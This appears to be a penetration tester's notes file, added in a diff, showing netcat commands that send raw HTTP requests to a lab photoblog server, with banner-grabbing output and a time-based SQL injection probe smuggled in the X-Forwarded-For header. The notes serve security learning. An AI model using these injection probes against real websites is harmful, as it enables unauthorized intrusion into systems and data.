@@ -1,0 +1,194 @@
+- echo "HEAD / HTTP/1.1\r\nHost:VICTIM_IP\r\nConnection:close\r\n\r\n" | netcat VICTIM_IP 80
+
+VICTIM_IP 80
+HTTP/1.1 400 Bad Request               <<< <<< <<<
+Date: Thu, 05 May 2016 13:44:14 GMT
+Server: Apache/2.2.16 (Debian)
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+::: If you use Bash :::
+
+- echo -en "HEAD / HTTP/1.1\r\nHost:10.0.0.200\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
+
+HTTP/1.1 200 OK
+Date: Thu, 05 May 2016 13:59:25 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html
+
+
+:: time-based detection ::
+
+- echo -en "GET / HTTP/1.0\r\nX-Forwarded-For:10.0.0.3' or sleep(4) and '1'='1\r\nConnection: close\r\n\r\n" |netcat 10.0.0.200 80
+
+
+
+
+[SAMPLES]
+
+- echo -en "GET / HTTP/1.0\r\nX-Forwarded-For:10.0.0.3\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
+
+HTTP/1.1 200 OK
+Date: Thu, 05 May 2016 14:20:50 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Vary: Accept-Encoding
+Content-Length: 1343
+Connection: close
+Content-Type: text/html
+
+<html>
+  <head>
+    <link rel="stylesheet" id="base" href="css/default.css" type="text/css" media="screen" />
+
+    <title>My Photoblog - last picture</title>
+  </head>
+  <body>
+    
+  <div id="header">
+    <div id="logo">
+      <h1><a href="index.php">My Awesome Photoblog</a></h1>
+    </div>
+    <div id="menu">
+      <ul>  
+        <li class="active">
+            <a href="/"> Home  |</a> 
+        </li>
+        	<li><a href="cat.php?id=1">test | </a></li>
+	<li><a href="cat.php?id=2">ruxcon | </a></li>
+	<li><a href="cat.php?id=3">2010 | </a></li>
+        <li>
+          <a href="/all.php">All pictures |</a>
+        </li>
+ 
+        <li>
+          <a href="/admin/">Admin</a>
+        </li>
+        </ul>
+      </div>
+    </div> 
+
+  </div>
+
+    <div id="page">
+      <div id="content">
+        
+
+  
+  <div class="block" id="block-text">
+    <div class="secondary-navigation">
+      <div class="content">
+        <h2 class="title">Last picture: Cthulhu</h2>
+        
+        <div class="inner" align="center">
+          <p>
+            <img src="admin/uploads/cthulhu.png" alt="Cthulhu" />          </p>
+        </div>
+     </div>
+
+    </div>
+  </div>
+        <div id="footer">
+          <div class="block">
+            <p>No Copyright </p>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+  </div>
+  </body>
+</html>
+
+
+- echo -en "GET / HTTP/1.0\r\nX-Forwarded-For:10.0.0.3'\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
+
+HTTP/1.1 200 OK
+Date: Thu, 05 May 2016 14:24:03 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze14
+Vary: Accept-Encoding
+Content-Length: 1343
+Connection: close
+Content-Type: text/html
+
+<html>
+  <head>
+    <link rel="stylesheet" id="base" href="css/default.css" type="text/css" media="screen" />
+
+    <title>My Photoblog - last picture</title>
+  </head>
+  <body>
+    
+  <div id="header">
+    <div id="logo">
+      <h1><a href="index.php">My Awesome Photoblog</a></h1>
+    </div>
+    <div id="menu">
+      <ul>  
+        <li class="active">
+            <a href="/"> Home  |</a> 
+        </li>
+        	<li><a href="cat.php?id=1">test | </a></li>
+	<li><a href="cat.php?id=2">ruxcon | </a></li>
+	<li><a href="cat.php?id=3">2010 | </a></li>
+        <li>
+          <a href="/all.php">All pictures |</a>
+        </li>
+ 
+        <li>
+          <a href="/admin/">Admin</a>
+        </li>
+        </ul>
+      </div>
+    </div> 
+
+  </div>
+
+    <div id="page">
+      <div id="content">
+        
+
+  
+  <div class="block" id="block-text">
+    <div class="secondary-navigation">
+      <div class="content">
+        <h2 class="title">Last picture: Cthulhu</h2>
+        
+        <div class="inner" align="center">
+          <p>
+            <img src="admin/uploads/cthulhu.png" alt="Cthulhu" />          </p>
+        </div>
+     </div>
+
+    </div>
+  </div>
+
+
+
+
+        <div id="footer">
+          <div class="block">
+            <p>No Copyright </p>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+  </div>
+
+
+  </body>
+</html>
+
+
+
+
+Notes: 
+
+- The param HEAD only show the header and avoid the entire page.
+- The param CLOSE Tell the server to close the connection after processing the request.
